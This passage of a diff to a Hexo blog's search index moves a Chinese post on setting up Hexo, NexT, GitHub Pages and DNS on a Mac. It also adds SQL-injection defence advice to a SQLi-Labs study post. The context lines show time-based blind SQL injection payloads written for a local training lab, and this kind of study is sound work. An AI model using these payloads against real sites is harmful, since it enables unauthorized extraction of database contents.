+    <content><![CDATA[本文记录在 Mac 上搭建和维护 Hexo + NexT 博客的过程，涵盖 GitHub Pages、自定义域名与 DNS，并补充 HanLior 网站当前的项目目录、主题、文章阅读和页脚统计配置。
+
+
+配置Github项目在Github右上角点击Repository
+然后去New一个
+
+按照下面的输入配置，名字输入自己想要起的名字就可以
+
+生成密钥ssh-keygen -t rsa -b 4096然后一路回车，可以看到生成到了/Users/cr1sp/.ssh/id_rsa  这里Cr1sp是我电脑的用户名用编辑器打开，去复制id_rsa.pub到github：https://github.com/settings/ssh改变密钥认证方式：ssh-keyscan -t ed25519 github.com &gt;&gt; ~/.ssh/known_hosts测试是否成功：ssh -T git@github.com
+
+如果出现这样的字就是代表可以链接成功
+
+设置账号信息：
+git config --global user.name &quot;HanLior&quot;
+
+设置github邮箱：
+git config --global user.email &quot;你的 GitHub 邮箱&quot;
+
+下载Git这里我用的homebrew下载的git
+1.先安装homebrew/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;
+
+2.通过Homebrew安装Gitbrew install git
+
+3.验证是否安装成功
+出现这样的就是安装成功
+安装node.js1.下载node.jsbrew install node
+
+2.验证是否下载成功node --version
+
+
+搭建Hexo1.切换阿里云镜像源npm config set registry https://registry.npmmirror.com
+
+2.安装cnpmnpm install -g cnpm --registry=https://registry.npmmirror.com
+
+3.用 cnpm 安装 hexocnpm install -g hexo-cli
+
+4.验证是否安装成功
+本地创建Hexo博客文件先在本地目录里面创建一个文件夹
+mkdir blogcd bloghexo init
+
+然后看到blog目录文件里面有这些东西就可以
+
+node_modules: 依赖包public：存放生成的页面scaffolds：生成文章的一些模板source：用来存放你的文章themes：放下下载的主题_config.yml: 博客的核心配置文件（设置主体、标题等属性）
+
+启动cnpm install
+
+启动hexo hexo s -g
+
+访问127.0.0.1:4000
+
+配置域名解析，可以参考这篇文章
+https://www.duheweb.com/post/20210417143744.html
+然后去github配置一下域名，启用https
+
+本站实际配置记录以下配置对应本博客当前使用的 GitHub 仓库和域名：
+
+GitHub 用户：HanLior
+Pages 仓库：HanLior/HanLior.github.io
+域名：www.hanlior.top
+Hexo 项目目录：/Users/cr1sp/blog
+Hexo：8.1.2；NexT：8.21.1，Pisces 风格
+
+目录和发布链路博客源文件放在 /Users/cr1sp/blog。source/_posts 保存文章，source/categories、source/tags 和 source/about 保存导航页面；NexT 配置放在 _config.next.yml。文章图片托管在单独的图床仓库 xhcola/typora_drawing_bed，正文使用 raw.githubusercontent.com 图片链接，不把图片文件混进 Hexo 文章目录。
+发布时，Hexo 先把源文件生成到 public，再由 hexo-deployer-git 把生成结果推送到 Pages 仓库 HanLior/HanLior.github.io 的 main 分支。这个 Pages 仓库用于托管生成后的网站。
+配置 DNS在域名服务商的 DNS 解析页面添加以下记录。根域名用 4 条 A 记录，www 用 CNAME；CNAME 的记录值不要带 https:// 或末尾路径。
+
+
+
+主机记录
+类型
+记录值
+
+
+
+@
+A
+185.199.108.153
+
+
+@
+A
+185.199.109.153
+
+
+@
+A
+185.199.110.153
+
+
+@
+A
+185.199.111.153
+
+
+www
+CNAME
+HanLior.github.io
+
+
+在 GitHub 仓库 HanLior/HanLior.github.io 的 Settings → Pages 中，发布来源选择 Deploy from a branch，分支选择 main、目录选择 /(root)。Custom domain 填 www.hanlior.top。等 DNS 检查和 TLS 证书签发完成后，再启用 Enforce HTTPS。
+在 Hexo 的 source/CNAME 文件中只写自定义域名：
+www.hanlior.top
+
+不要把 CNAME 文件放在 source/_posts 里，也不要把它命名为 CNAME.txt。
+配置 Hexo 部署到 GitHub Pages在博客根目录 /Users/cr1sp/blog 安装部署插件：
+npm install hexo-deployer-git --save
+
+在根目录的 _config.yml 配置仓库和分支：
+deploy:  type: git  repo: git@github.com:HanLior/HanLior.github.io.git  branch: main
+
+每次发布前先清理并重新生成，再部署：
+npx hexo cleannpx hexo generatenpx hexo deploy
+
+也可以依次使用 hexo clean、hexo generate、hexo deploy。第一次在本机部署时需要已经配置 GitHub SSH Key，并确认 ssh -T git@github.com 可以连接。
+安装并启用 NexT 主题本站使用 NexT 8.21.1，主题通过 npm 安装并由 package.json 管理：
+npm install hexo-theme-next@8.21.1 --save
+
+Hexo 根目录 _config.yml 中设置：
+theme: next
+
+主题设置写在博客根目录的 _config.next.yml，不是 themes/next/_config.yml。本站使用 Pisces、深色模式、左侧文章侧栏、中文导航和 GitHub 个人链接：
+scheme: Piscesdarkmode: truesidebar:  position: left  display: postmenu:  home: / || home  categories: /categories/ || th  tags: /tags/ || tags  about: /about/ || usersocial:  GitHub: https://github.com/HanLior || fab fa-github
+
+menu 中的页面需在 source 目录下创建对应页面。本站导航显示首页、分类、标签和关于；归档页面仍可通过 /archives/ 访问，但没有放进主导航。
+archives: /archives/ || archive
+
+创建分类、标签和关于页面可用 Hexo 命令生成页面：
+npx hexo new page categoriesnpx hexo new page tagsnpx hexo new page about
+
+命令会创建 source/&lt;页面名&gt;/index.md。分类页和标签页的 front matter 分别设置 type: categories、type: tags；这些页面以及关于页均可设置 comments: false。例如：
+---title: 分类type: categoriescomments: false---
+
+文章通过 front matter 设置分类和标签。本站的分类包括“博客搭建”“逆向学习”和“web安全学习”。Hexo 默认会隐藏没有文章的分类；persistent_categories 配置和 scripts/persistent-categories.js 会让预设分类在文章发布前也能显示。文章归入该分类后，分类页会自动列出文章。
+首页摘要、分页和文章信息本站首页每页显示 10 篇文章。文章使用 &lt;!-- more --&gt; 分隔摘要和正文：首页只显示分隔符之前的内容，读者点击“阅读全文”进入全文。新文章可按下面的结构设置分类、标签和摘要：
+---title: 文章标题date: 2026-11-02 16:00:00categories:  - web安全学习tags:  - PHP---这里写首页摘要。&lt;!-- more --&gt;这里开始是文章全文。
+
+字数和预计阅读时间由 hexo-word-counter 生成，只有文章级统计开启，不显示全站总字数或总阅读时间：
+npm install hexo-word-counter --save
+
+Hexo 根目录 _config.yml：
+symbols_count_time:  symbols: true  time: true  total_symbols: false  total_time: false
+
+主题配置 _config.next.yml 控制发表于日期、分类和字数&#x2F;阅读时间布局。source/_data/post-meta.njk 额外显示文章文件的实际修改日期和时间：
+post_meta:  item_text: true  created_at: true  updated_at:    enable: false    another_day: true  categories: truesymbols_count_time:  separated_meta: true  item_text_total: falsecustom_file_path:  postMeta: source/_data/post-meta.njk
+
+项目的 updated_option 设为 mtime，因此文章更新信息根据源文件修改时间生成。自定义元信息模板会把更新日期和时分秒显示在文章标题下方。
+本站开启的搜索和 SEO 基础功能安装搜索索引、Atom 订阅和站点地图插件：
+npm install hexo-generator-searchdb hexo-generator-feed hexo-generator-sitemap --save
+
+Hexo 根目录 _config.yml 中配置搜索索引、订阅和站点地图：
+search:  path: search.xml  field: post  content: true  format: striptagsfeed:  type: atom  path: atom.xml  limit: 20sitemap:  path: sitemap.xml  tags: true  categories: true
+
+NexT 的 _config.next.yml 开启本地搜索：
+local_search:  enable: true  top_n_per_article: 1  unescape: false  preload: false
+
+本站在 _config.next.yml 中开启了 Mac 风格的代码块复制按钮：
+codeblock:  copy_button:    enable: true    style: mac
+
+页脚的访客数和浏览量写在 source/_data/footer.njk，通过兼容不蒜子接口的脚本 https://busuanzi.meuicat.com/js 显示。NexT 内置的不蒜子开关保持关闭，因为原接口曾返回 502。切换到新服务后，访客数和浏览量从新服务开始累计。相同页脚还显示博客运行时间，起点为首次部署记录的北京时间 2026-10-16 18:48:16。
+根目录配置还要填写站点标题、作者、语言、时区和正式网址。本站当前值如下：
+title: HanLiorsubtitle: 技术学习与实践description: HanLior 的个人博客，记录技术学习、项目实践与思考。keywords: Hexo, NexT, HanLiorauthor: HanLiorlanguage: zh-CNtimezone: Asia/Shanghaiurl: https://www.hanlior.top
+
+搜索引擎抓取规则放在 source/robots.txt：
+User-agent: *Allow: /Sitemap: https://www.hanlior.top/sitemap.xml
+
+本站开启了 NexT 深色模式、左侧侧栏、本地搜索和代码复制。网站根目录 _config.yml 还设置每页 10 篇、Atom 订阅、站点地图和 robots.txt。访问统计会在访客打开网页后逐步累计。
+删除默认示例文章Hexo 初始化时会生成 source/_posts/hello-world.md。删除该文件并重新部署后，文章和归档列表里就不会再显示 Hello World。source/index.md 是没有文章时的首页提示；有文章时，首页由文章索引生成器列出文章摘要：
+---title: 首页layout: pagecomments: false---文章正在整理中，欢迎稍后再来。
+
+之后写新文章可运行：
+npx hexo new post &quot;文章标题&quot;
+
+完成编辑后再运行清理、生成和部署命令。
+]]></content>
+      <categories>
+        <category>博客搭建</category>
+      </categories>
+      <tags>
+        <tag>Mac</tag>
+        <tag>Hexo</tag>
+        <tag>NexT</tag>
+        <tag>GitHub Pages</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入学习：基础原理与 SQLi-Labs 练习</title>
     <url>/2026/11/02/sql-injection-learning/</url>
-    <content><![CDATA[本文整理 SQL 注入的分类、常见函数、联合查询、报错注入、布尔与时间盲注，并记录 SQLi-Labs Less 1–10 的练习过程。示例针对本地靶场环境。
+    <content><![CDATA[本文记录 SQL 注入的基本类型、常见函数、联合查询、报错注入、布尔与时间盲注，并整理 SQLi-Labs Less 1–10 的本地靶场练习。文中测试仅适用于授权的本地学习环境。
 
 
 1.SQL注入的类型1.1基于从服务器接收的响应
@@ -757,6 +1140,16 @@ Less - 9时间盲注
 ?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+
 
 Less - 10时间盲注，闭合方式和9不一样而已
+总结SQL 注入的主要防御方法有：
+
+使用参数化查询或预编译语句，避免直接拼接用户输入；
+对输入进行类型和格式校验，例如 ID 只允许整数；
+数据库账户使用最小权限，禁止不必要的增删改和文件操作权限；
+不向用户直接返回详细 SQL 错误信息；
+避免使用黑名单过滤关键词，因为容易被绕过；
+对关键操作进行权限验证和日志记录；
+定期进行代码审计和安全测试。
+
 ]]></content>
       <categories>
         <category>web安全学习</category>
@@ -765,193 +1158,6 @@ Less - 10时间盲注，闭合方式和9不一样而已
         <tag>CTF</tag>
         <tag>SQL注入</tag>
         <tag>MySQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>在Mac上搭建个人博客：Hexo + NexT + 自定义域名搭建永久有效的个人博客网站</title>
-    <url>/2026/10/16/mac-hexo-next-custom-domain-blog/</url>
-    <content><![CDATA[本文记录在 Mac 上搭建和维护 Hexo + NexT 博客的过程，涵盖 GitHub Pages、自定义域名与 DNS，并补充 HanLior 网站当前的项目目录、主题、文章阅读和页脚统计配置。
-
-
-配置Github项目在Github右上角点击Repository
-然后去New一个
-
-按照下面的输入配置，名字输入自己想要起的名字就可以
-
-生成密钥ssh-keygen -t rsa -b 4096然后一路回车，可以看到生成到了/Users/cr1sp/.ssh/id_rsa  这里Cr1sp是我电脑的用户名用编辑器打开，去复制id_rsa.pub到github：https://github.com/settings/ssh改变密钥认证方式：ssh-keyscan -t ed25519 github.com &gt;&gt; ~/.ssh/known_hosts测试是否成功：ssh -T git@github.com
-
-如果出现这样的字就是代表可以链接成功
-
-设置账号信息：
-git config --global user.name &quot;HanLior&quot;
-
-设置github邮箱：
-git config --global user.email &quot;你的 GitHub 邮箱&quot;
-
-下载Git这里我用的homebrew下载的git
-1.先安装homebrew/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;
-
-2.通过Homebrew安装Gitbrew install git
-
-3.验证是否安装成功
-出现这样的就是安装成功
-安装node.js1.下载node.jsbrew install node
-
-2.验证是否下载成功node --version
-
-
-搭建Hexo1.切换阿里云镜像源npm config set registry https://registry.npmmirror.com
-
-2.安装cnpmnpm install -g cnpm --registry=https://registry.npmmirror.com
-
-3.用 cnpm 安装 hexocnpm install -g hexo-cli
-
-4.验证是否安装成功
-本地创建Hexo博客文件先在本地目录里面创建一个文件夹
-mkdir blogcd bloghexo init
-
-然后看到blog目录文件里面有这些东西就可以
-
-node_modules: 依赖包public：存放生成的页面scaffolds：生成文章的一些模板source：用来存放你的文章themes：放下下载的主题_config.yml: 博客的核心配置文件（设置主体、标题等属性）
-
-启动cnpm install
-
-启动hexo hexo s -g
-
-访问127.0.0.1:4000
-
-配置域名解析，可以参考这篇文章
-https://www.duheweb.com/post/20210417143744.html
-然后去github配置一下域名，启用https
-
-本站实际配置记录以下配置对应本博客当前使用的 GitHub 仓库和域名：
-
-GitHub 用户：HanLior
-Pages 仓库：HanLior/HanLior.github.io
-域名：www.hanlior.top
-Hexo 项目目录：/Users/cr1sp/blog
-Hexo：8.1.2；NexT：8.21.1，Pisces 风格
-
-目录和发布链路博客源文件放在 /Users/cr1sp/blog。source/_posts 保存文章，source/categories、source/tags 和 source/about 保存导航页面；NexT 配置放在 _config.next.yml。文章图片托管在单独的图床仓库 xhcola/typora_drawing_bed，正文使用 raw.githubusercontent.com 图片链接，不把图片文件混进 Hexo 文章目录。
-发布时，Hexo 先把源文件生成到 public，再由 hexo-deployer-git 把生成结果推送到 Pages 仓库 HanLior/HanLior.github.io 的 main 分支。这个 Pages 仓库用于托管生成后的网站。
-配置 DNS在域名服务商的 DNS 解析页面添加以下记录。根域名用 4 条 A 记录，www 用 CNAME；CNAME 的记录值不要带 https:// 或末尾路径。
-
-
-
-主机记录
-类型
-记录值
-
-
-
-@
-A
-185.199.108.153
-
-
-@
-A
-185.199.109.153
-
-
-@
-A
-185.199.110.153
-
-
-@
-A
-185.199.111.153
-
-
-www
-CNAME
-HanLior.github.io
-
-
-在 GitHub 仓库 HanLior/HanLior.github.io 的 Settings → Pages 中，发布来源选择 Deploy from a branch，分支选择 main、目录选择 /(root)。Custom domain 填 www.hanlior.top。等 DNS 检查和 TLS 证书签发完成后，再启用 Enforce HTTPS。
-在 Hexo 的 source/CNAME 文件中只写自定义域名：
-www.hanlior.top
-
-不要把 CNAME 文件放在 source/_posts 里，也不要把它命名为 CNAME.txt。
-配置 Hexo 部署到 GitHub Pages在博客根目录 /Users/cr1sp/blog 安装部署插件：
-npm install hexo-deployer-git --save
-
-在根目录的 _config.yml 配置仓库和分支：
-deploy:  type: git  repo: git@github.com:HanLior/HanLior.github.io.git  branch: main
-
-每次发布前先清理并重新生成，再部署：
-npx hexo cleannpx hexo generatenpx hexo deploy
-
-也可以依次使用 hexo clean、hexo generate、hexo deploy。第一次在本机部署时需要已经配置 GitHub SSH Key，并确认 ssh -T git@github.com 可以连接。
-安装并启用 NexT 主题本站使用 NexT 8.21.1，主题通过 npm 安装并由 package.json 管理：
-npm install hexo-theme-next@8.21.1 --save
-
-Hexo 根目录 _config.yml 中设置：
-theme: next
-
-主题设置写在博客根目录的 _config.next.yml，不是 themes/next/_config.yml。本站使用 Pisces、深色模式、左侧文章侧栏、中文导航和 GitHub 个人链接：
-scheme: Piscesdarkmode: truesidebar:  position: left  display: postmenu:  home: / || home  categories: /categories/ || th  tags: /tags/ || tags  about: /about/ || usersocial:  GitHub: https://github.com/HanLior || fab fa-github
-
-menu 中的页面需在 source 目录下创建对应页面。本站导航显示首页、分类、标签和关于；归档页面仍可通过 /archives/ 访问，但没有放进主导航。
-archives: /archives/ || archive
-
-创建分类、标签和关于页面可用 Hexo 命令生成页面：
-npx hexo new page categoriesnpx hexo new page tagsnpx hexo new page about
-
-命令会创建 source/&lt;页面名&gt;/index.md。分类页和标签页的 front matter 分别设置 type: categories、type: tags；这些页面以及关于页均可设置 comments: false。例如：
----title: 分类type: categoriescomments: false---
-
-文章通过 front matter 设置分类和标签。本站的分类包括“博客搭建”“逆向学习”和“web安全学习”。Hexo 默认会隐藏没有文章的分类；persistent_categories 配置和 scripts/persistent-categories.js 会让预设分类在文章发布前也能显示。文章归入该分类后，分类页会自动列出文章。
-首页摘要、分页和文章信息本站首页每页显示 10 篇文章。文章使用 &lt;!-- more --&gt; 分隔摘要和正文：首页只显示分隔符之前的内容，读者点击“阅读全文”进入全文。新文章可按下面的结构设置分类、标签和摘要：
----title: 文章标题date: 2026-11-02 16:00:00categories:  - web安全学习tags:  - PHP---这里写首页摘要。&lt;!-- more --&gt;这里开始是文章全文。
-
-字数和预计阅读时间由 hexo-word-counter 生成，只有文章级统计开启，不显示全站总字数或总阅读时间：
-npm install hexo-word-counter --save
-
-Hexo 根目录 _config.yml：
-symbols_count_time:  symbols: true  time: true  total_symbols: false  total_time: false
-
-主题配置 _config.next.yml 控制发表于日期、分类和字数&#x2F;阅读时间布局。source/_data/post-meta.njk 额外显示文章文件的实际修改日期和时间：
-post_meta:  item_text: true  created_at: true  updated_at:    enable: false    another_day: true  categories: truesymbols_count_time:  separated_meta: true  item_text_total: falsecustom_file_path:  postMeta: source/_data/post-meta.njk
-
-项目的 updated_option 设为 mtime，因此文章更新信息根据源文件修改时间生成。自定义元信息模板会把更新日期和时分秒显示在文章标题下方。
-本站开启的搜索和 SEO 基础功能安装搜索索引、Atom 订阅和站点地图插件：
-npm install hexo-generator-searchdb hexo-generator-feed hexo-generator-sitemap --save
-
-Hexo 根目录 _config.yml 中配置搜索索引、订阅和站点地图：
-search:  path: search.xml  field: post  content: true  format: striptagsfeed:  type: atom  path: atom.xml  limit: 20sitemap:  path: sitemap.xml  tags: true  categories: true
-
-NexT 的 _config.next.yml 开启本地搜索：
-local_search:  enable: true  top_n_per_article: 1  unescape: false  preload: false
-
-本站在 _config.next.yml 中开启了 Mac 风格的代码块复制按钮：
-codeblock:  copy_button:    enable: true    style: mac
-
-页脚的访客数和浏览量写在 source/_data/footer.njk，通过兼容不蒜子接口的脚本 https://busuanzi.meuicat.com/js 显示。NexT 内置的不蒜子开关保持关闭，因为原接口曾返回 502。切换到新服务后，访客数和浏览量从新服务开始累计。相同页脚还显示博客运行时间，起点为首次部署记录的北京时间 2026-10-16 18:48:16。
-根目录配置还要填写站点标题、作者、语言、时区和正式网址。本站当前值如下：
-title: HanLiorsubtitle: 技术学习与实践description: HanLior 的个人博客，记录技术学习、项目实践与思考。keywords: Hexo, NexT, HanLiorauthor: HanLiorlanguage: zh-CNtimezone: Asia/Shanghaiurl: https://www.hanlior.top
-
-搜索引擎抓取规则放在 source/robots.txt：
-User-agent: *Allow: /Sitemap: https://www.hanlior.top/sitemap.xml
-
-本站开启了 NexT 深色模式、左侧侧栏、本地搜索和代码复制。网站根目录 _config.yml 还设置每页 10 篇、Atom 订阅、站点地图和 robots.txt。访问统计会在访客打开网页后逐步累计。
-删除默认示例文章Hexo 初始化时会生成 source/_posts/hello-world.md。删除该文件并重新部署后，文章和归档列表里就不会再显示 Hello World。source/index.md 是没有文章时的首页提示；有文章时，首页由文章索引生成器列出文章摘要：
----title: 首页layout: pagecomments: false---文章正在整理中，欢迎稍后再来。
-
-之后写新文章可运行：
-npx hexo new post &quot;文章标题&quot;
-
-完成编辑后再运行清理、生成和部署命令。
-]]></content>
-      <categories>
-        <category>博客搭建</category>
-      </categories>
-      <tags>
-        <tag>Mac</tag>
-        <tag>Hexo</tag>
-        <tag>NexT</tag>
-        <tag>GitHub Pages</tag>
       </tags>
   </entry>
 </search>
